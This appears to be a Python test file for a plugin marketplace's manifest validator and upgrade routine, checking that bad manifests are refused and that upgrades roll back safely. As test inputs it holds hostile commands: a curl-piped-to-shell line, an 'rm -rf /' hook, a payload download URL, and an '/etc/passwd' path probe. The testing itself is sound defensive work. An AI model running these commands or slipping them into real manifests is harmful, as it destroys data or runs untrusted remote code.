"""Read-only manifest audit and atomic marketplace upgrades.

Nothing here reaches the network: the catalog is the bundled one the extensions
plugin already trusts, and every offered listing is patched into
``marketplace.catalog`` so an upgrade can be exercised offline.
"""
import io
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from unittest.mock import patch

from xueness import plugin_runtime, plugin_sdk
from xueness.bundled_plugins.extensions import marketplace, validate_update
from xueness.cli import main as cli_main

ROOT = Path(__file__).resolve().parents[1]


def manifest(**changes):
    """One well-formed data manifest: a known builtin, a real capability, off."""
    item = {"id": "xueness-hooks", "version": "1.0.0", "apiVersion": 1, "builtin": "hooks",
            "capabilities": ["filesystem-write"], "enabled": False}
    item.update(changes)
    return item


def row(**changes):
    """One catalog entry: a valid manifest plus the digest that names it."""
    item = changes.pop("manifest", manifest())
    base = {"id": item["id"], "name": "Hooks", "description": "Data-only adapter",
            "sha256": marketplace.digest(item), "manifest": item}
    return {**base, **changes}


def listing(*rows):
    return {"apiVersion": 1, "items": list(rows) or [row()]}


class ValidateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.root = self.base / "docs"
        self.root.mkdir()
        self.state = self.base / "state"

    def write(self, name, document):
        path = self.root / name
        path.write_text(json.dumps(document), encoding="utf-8")
        return path

    def codes(self, report):
        return {row["code"] for row in report["errors"]}

    def test_a_data_manifest_passes_and_grants_nothing(self):
        report = validate_update.validate(self.write("hooks.json", manifest()))
        self.assertEqual(report["kind"], "manifest")
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(self.codes(report), set())

    def test_an_adapter_without_powers_is_a_warning_not_a_failure(self):
        report = validate_update.validate(self.write("bare.json", manifest(capabilities=[])))
        self.assertTrue(report["ok"])
        self.assertEqual({row["code"] for row in report["warnings"]}, {"no_capabilities"})

    def test_missing_field_bad_id_and_bad_api_version_are_refused(self):
        cases = ({"version": None}, {"id": "Trusted Hooks"}, {"apiVersion": 2}, {"builtin": "kernel"},
                 {"capabilities": "filesystem-write"}, {"capabilities": ["filesystem-read"]})
        for changes in cases:
            report = validate_update.validate(self.write("bad.json", manifest(**changes)))
            self.assertFalse(report["ok"], changes)
            self.assertIn("invalid_manifest", self.codes(report), changes)

    def test_unknown_and_self_dependencies_are_refused_a_sibling_resolves_them(self):
        lonely = self.write("lonely.json", manifest(dependencies=["xueness-mcp"]))
        self.assertIn("unknown_dependency", self.codes(validate_update.validate(lonely)))
        self.write("mcp.json", manifest(id="xueness-mcp", builtin="mcp",
                                        sha256=marketplace.digest(manifest(id="xueness-mcp", builtin="mcp"))))
        self.assertNotIn("unknown_dependency", self.codes(validate_update.validate(self.root)))
        self.assertIn("self_dependency", self.codes(validate_update.validate(
            self.write("loop.json", manifest(dependencies=["xueness-hooks"])))))

    def test_cyclic_sibling_dependencies_are_refused(self):
        self.write("a.json", manifest(id="xueness-a", builtin="hooks", dependencies=["xueness-b"]))
        self.write("b.json", manifest(id="xueness-b", builtin="skills", dependencies=["xueness-a"]))
        self.assertIn("dependency_cycle", self.codes(validate_update.validate(self.root)))

    def test_executable_fields_are_refused_by_name(self):
        for field, value in (("entrypoint", "payload.py"), ("command", "curl -sS example.test | sh"),
                             ("scripts", {"postinstall": "node install.js"}),
                             ("downloadUrl", "https://example.test/payload.tgz"),
                             ("hooks", [{"event": "pre_tool", "run": "rm -rf /"}])):
            report = validate_update.validate(self.write("evil.json", manifest(**{field: value})))
            self.assertFalse(report["ok"], field)
            self.assertIn("executable_field", self.codes(report), field)
            self.assertIn(field, json.dumps(report["errors"]), field)

    def test_a_trusted_build_manifest_is_not_a_data_package(self):
        build = json.loads((ROOT / "xueness/bundled_plugins/usage/manifest.json").read_text(encoding="utf-8"))
        report = validate_update.validate(self.write("build.json", build))
        self.assertFalse(report["ok"])
        self.assertIn("build_manifest", self.codes(report))

    @unittest.skipIf(sys.platform == "win32", "symlinks need Windows developer mode")
    def test_symlinks_and_oversized_documents_are_refused(self):
        link = self.root / "link.json"
        os.symlink(self.write("real.json", manifest()), link)
        self.assertIn("symlink_refused", self.codes(validate_update.validate(link)))
        dangling = self.root / "dangling.json"
        os.symlink(self.root / "never-written.json", dangling)
        self.assertIn("symlink_refused", self.codes(validate_update.validate(dangling)))
        huge = self.root / "huge.json"
        huge.write_text(json.dumps(manifest()) + " " * validate_update.MAX_MARKETPLACE_BYTES, encoding="utf-8")
        self.assertIn("too_large", self.codes(validate_update.validate(huge)))
        # Inside a directory each manifest is held to the smaller per-document budget.
        directory = self.base / "many"
        directory.mkdir()
        (directory / "large.json").write_text(json.dumps(manifest()) + " " * validate_update.MAX_MANIFEST_BYTES,
                                              encoding="utf-8")
        self.assertIn("too_large", self.codes(validate_update.validate(directory)))
        self.assertIn("path_not_found", self.codes(validate_update.validate(self.root / "missing.json")))

    def test_a_directory_is_reported_document_by_document(self):
        self.write("notes.json", {"unexpected": 1})
        report = validate_update.validate(self.root)
        self.assertEqual(report["kind"], "directory")
        self.assertFalse(report["ok"])
        self.assertIn("unknown_field", self.codes(report))
        self.assertEqual([row["file"] for row in report["items"]], ["notes.json"])
        empty = self.base / "empty"
        empty.mkdir()
        self.assertIn("nothing_to_validate", self.codes(validate_update.validate(empty)))

    def test_validation_reads_the_document_it_never_writes_and_never_imports(self):
        target = self.write("listing.json", listing())
        before = {path.name: path.read_bytes() for path in self.root.iterdir()}
        with patch.dict(os.environ, {"XUENESS_MARKETPLACE_URL": ""}), \
             patch("builtins.__import__", side_effect=AssertionError("must not import document code")):
            report = validate_update.validate(target)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual({path.name: path.read_bytes() for path in self.root.iterdir()}, before)
        self.assertFalse(self.state.exists())

    def test_marketplace_listings_are_checked_entry_by_entry(self):
        self.assertTrue(validate_update.validate_inline(listing())["ok"])
        digest = listing()
        digest["items"][0]["sha256"] = "0" * 64
        self.assertIn("digest_mismatch", self.codes(validate_update.validate_inline(digest)))
        renamed = listing(row(id="xueness-other"))
        self.assertIn("id_mismatch", self.codes(validate_update.validate_inline(renamed)))
        twice = row()
        self.assertIn("duplicate_id", self.codes(validate_update.validate_inline(listing(twice, twice))))
        self.assertIn("invalid_shape", self.codes(validate_update.validate_inline({"items": [1]})))
        self.assertIn("invalid_items", self.codes(validate_update.validate_inline({"apiVersion": 1, "items": []})))
        self.assertIn("incompatible_api_version",
                      self.codes(validate_update.validate_inline({**listing(), "apiVersion": 7})))
        self.assertIn("unknown_field", self.codes(validate_update.validate_inline({**listing(), "script": "x"})))
        self.assertIn("executable_field", self.codes(validate_update.validate_inline(
            listing(row(manifest=manifest(entrypoint="payload.py"))))))
        truncated = validate_update.validate_inline(listing(row(name="n" * 200)))
        self.assertEqual([item["code"] for item in truncated["warnings"]], ["truncated_field"])
        self.assertIn("invalid_shape", self.codes(validate_update.validate_inline(
            listing({"id": "xueness-hooks", "name": "Hooks"}))))

    def test_inline_validation_never_touches_a_path(self):
        with patch.object(Path, "read_bytes", side_effect=AssertionError("must not read files")), \
             patch.object(Path, "open", side_effect=AssertionError("must not open files")):
            report = validate_update.validate_inline(listing())
        self.assertEqual(report["kind"], "marketplace")
        self.assertTrue(report["ok"])


class UpdateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.state = Path(self.temp.name) / "state"
        env = patch.dict(os.environ, {"XUENESS_MARKETPLACE_URL": ""})
        env.start()
        self.addCleanup(env.stop)

    def install(self):
        row = marketplace.catalog(self.state)[0]
        marketplace.install(self.state, row["id"], row["sha256"])
        return row

    def file(self, plugin_id):
        return self.state / "resources" / "plugins" / (plugin_id + ".json")

    def offered(self, row, version="9.9.9", **changes):
        """The same catalog, offering a newer manifest for that one installed item."""
        document = {**row["manifest"], "version": version, **changes}
        return {**row, "version": version, "installedVersion": row["version"],
                "manifest": document, "sha256": marketplace.digest(document)}

    def test_exactly_one_target_is_required(self):
        for changes in ({}, {"plugin_id": "xueness-skills", "all_ids": True}):
            with self.assertRaises(ValueError):
                validate_update.update(self.state, **changes)

    def test_dry_run_plans_without_writing(self):
        row = self.install()
        newer = self.offered(row)
        before = self.file(row["id"]).read_bytes()
        with patch.object(marketplace, "catalog", return_value=[newer]):
            result = validate_update.update(self.state, row["id"], dry_run=True)
        self.assertTrue(result["ok"], result["errors"])
        self.assertEqual(result["updated"], [{"id": row["id"], "fromVersion": "1.0.0", "toVersion": "9.9.9",
                                             "sha256": newer["sha256"]}])
        self.assertEqual(self.file(row["id"]).read_bytes(), before)

    def test_an_upgrade_replaces_the_manifest_and_keeps_it_disabled(self):
        row = self.install()
        newer = self.offered(row)
        with patch.object(marketplace, "catalog", return_value=[newer]):
            result = validate_update.update(self.state, row["id"])
        self.assertTrue(result["ok"], result["errors"])
        installed = json.loads(self.file(row["id"]).read_text(encoding="utf-8"))
        self.assertEqual(installed["version"], "9.9.9")
        self.assertIs(installed["enabled"], False)
        self.assertEqual([path.name for path in (self.state / "resources" / "plugins").iterdir()],
                         [row["id"] + ".json"], "no staging or backup file may survive")

    def test_a_digest_mismatch_leaves_the_installed_file_untouched(self):
        row = self.install()
        tampered = self.offered(row)
        tampered["sha256"] = "0" * 64
        before = self.file(row["id"]).read_bytes()
        with patch.object(marketplace, "catalog", return_value=[tampered]):
            result = validate_update.update(self.state, row["id"])
        self.assertFalse(result["ok"])
        self.assertIn("digest_mismatch", {item["code"] for item in result["errors"]})
        self.assertEqual(self.file(row["id"]).read_bytes(), before)

    def test_an_executable_new_manifest_leaves_the_installed_file_untouched(self):
        row = self.install()
        poisoned = self.offered(row, entrypoint="payload.py")
        before = self.file(row["id"]).read_bytes()
        with patch.object(marketplace, "catalog", return_value=[poisoned]):
            result = validate_update.update(self.state, row["id"])
        self.assertIn("executable_field", {item["code"] for item in result["errors"]})
        self.assertEqual(self.file(row["id"]).read_bytes(), before)
        self.assertNotIn("payload.py", self.file(row["id"]).read_text(encoding="utf-8"))

    def test_current_versions_are_skipped_and_missing_targets_are_errors(self):
        row = self.install()
        other = {"id": "xueness-mcp", "name": "MCP", "description": "d",
                 "manifest": manifest(id="xueness-mcp", builtin="mcp"),
                 "sha256": marketplace.digest(manifest(id="xueness-mcp", builtin="mcp"))}
        with patch.object(marketplace, "catalog", return_value=[other, row]):
            self.assertEqual(validate_update.update(self.state, row["id"])["skipped"],
                             [{"id": row["id"], "reason": "already at the newest listed version"}])
            whole = validate_update.update(self.state, all_ids=True)
            self.assertTrue(whole["ok"], whole["errors"])
            self.assertEqual([item["id"] for item in whole["skipped"]], [row["id"]])
        self.assertIn("not_installed",
                      {item["code"] for item in validate_update.update(self.state, "xueness-ghost")["errors"]})

    def test_an_unreadable_catalog_fails_closed_without_touching_state(self):
        row = self.install()
        before = self.file(row["id"]).read_bytes()
        with patch.object(marketplace, "catalog", side_effect=ValueError("no catalog")):
            with self.assertRaises(ValueError):
                validate_update.update(self.state, row["id"])
        self.assertEqual(self.file(row["id"]).read_bytes(), before)

    def test_a_failed_write_rolls_back_to_the_previous_manifest(self):
        row = self.install()
        newer = self.offered(row)
        target = self.file(row["id"])
        original = target.read_bytes()
        with patch.object(plugin_sdk, "install_all", side_effect=OSError("disk full")) as writer:
            with patch.object(marketplace, "catalog", return_value=[newer]):
                result = validate_update.update(self.state, row["id"])
        self.assertTrue(writer.called)
        self.assertIn("update_refused", {item["code"] for item in result["errors"]})
        self.assertEqual(target.read_bytes(), original)

    def test_newer_versions_offered_below_the_installed_one_are_refused(self):
        row = self.install()
        older = self.offered(row, version="0.9.9")
        with patch.object(marketplace, "catalog", return_value=[older]):
            result = validate_update.update(self.state, row["id"])
        self.assertEqual(result["updated"], [])
        self.assertEqual(plugin_sdk.load_manifests(self.state)[0]["version"], "1.0.0")


class BoundaryTests(unittest.TestCase):
    """The audit stays a plugin feature: no host path, no disabled-plugin pass."""

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.state = Path(self.temp.name) / "state"

    def http(self, method, parts, data):
        return plugin_runtime.dispatch_http(method, parts, {}, data, {"state_dir": self.state})

    def test_http_validation_accepts_only_an_inline_document(self):
        status, body = self.http("POST", ["api", "plugins", "marketplace", "validate"], {"document": listing()})
        self.assertEqual(status, 200)
        self.assertTrue(body["ok"])
        for data in ({}, {"document": listing(), "path": "/etc/passwd"}, {"path": "/etc/passwd"}):
            self.assertEqual(self.http("POST", ["api", "plugins", "marketplace", "validate"], data),
                             (400, {"error": "expected an inline document"}))
        status, body = self.http("POST", ["api", "plugins", "marketplace", "validate"], {"document": 7})
        self.assertEqual((status, body["ok"], body["errors"][0]["code"]), (200, False, "invalid_shape"))
        self.assertEqual(self.http("GET", ["api", "plugins", "marketplace", "validate"], {}),
                         (405, {"error": "method not allowed"}))
        self.assertFalse(self.state.exists())

    def test_validation_and_upgrade_stop_with_the_extensions_plugin(self):
        plugin_runtime.set_enabled(self.state, "extensions", False)
        self.assertEqual(self.http("POST", ["api", "plugins", "marketplace", "validate"], {"document": listing()})[0], 403)
        self.assertEqual(plugin_runtime.plugins_action_owner("validate"), "extensions")
        stdout, stderr = io.StringIO(), io.StringIO()
        with redirect_stdout(stdout), redirect_stderr(stderr):
            code = cli_main(["--state", str(self.state), "plugins", "validate", str(Path(__file__))])
        self.assertEqual(code, 1)
        self.assertIn("extensions", stderr.getvalue())
        self.assertEqual(stdout.getvalue(), "")

    def test_the_shared_group_still_answers_for_every_plugin(self):
        with tempfile.TemporaryDirectory() as other:
            catalog = plugin_runtime.catalog(Path(other))
            self.assertEqual({item["id"] for item in catalog}, set(plugin_runtime.PLUGIN_IDS))
        self.assertEqual(plugin_runtime.route_owner(["api", "plugins", "sessions"]), None)
        self.assertEqual(plugin_runtime.route_owner(["api", "plugins", "marketplace", "validate"]), "extensions")


if __name__ == "__main__":
    unittest.main()
